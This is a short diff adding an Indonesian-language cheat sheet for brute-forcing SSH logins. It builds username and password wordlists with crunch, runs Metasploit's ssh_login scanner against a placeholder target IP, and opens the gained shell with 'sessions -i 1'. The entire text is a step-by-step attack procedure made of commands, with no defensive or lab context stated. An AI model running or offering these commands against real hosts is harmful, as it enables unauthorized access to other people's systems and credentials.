@@ -1,0 +1,19 @@
+### bruteforce ssh 
+
+# buat wordlists dengan tools crunch
+# angka 8 adalah min & max jumlah karakternya yaitu 8,,dan karakter acak yang mengarah ke user atau passwordnya
+
+$ crunch 8 8 msidfna -o user.txt
+$ crunch 8 8 msidfna -o pass.txt
+
+# buka msfconsole untuk enumeration
+$ msfconsole
+msf 6 > use auxiliary/scanner/ssh/ssh_login
+msf auxiliary(scanner/ssh/ssh_login) > set RHOSTS <ip target>
+msf auxiliary(scanner/ssh/ssh_login) > set USER_FILE user.txt
+msf auxiliary(scanner/ssh/ssh_login) > set PASS_FILE pass.txt
+msf auxiliary(scanner/ssh/ssh_login) > run 
+# kita sudah berhsil login
+# untuk menggunakan shell nya ketik sessions  kemudian kita beri id dengan flag -i dan pilih 1
+msf auxiliary(scanner/ssh/ssh_login) > sessions -i 1
+
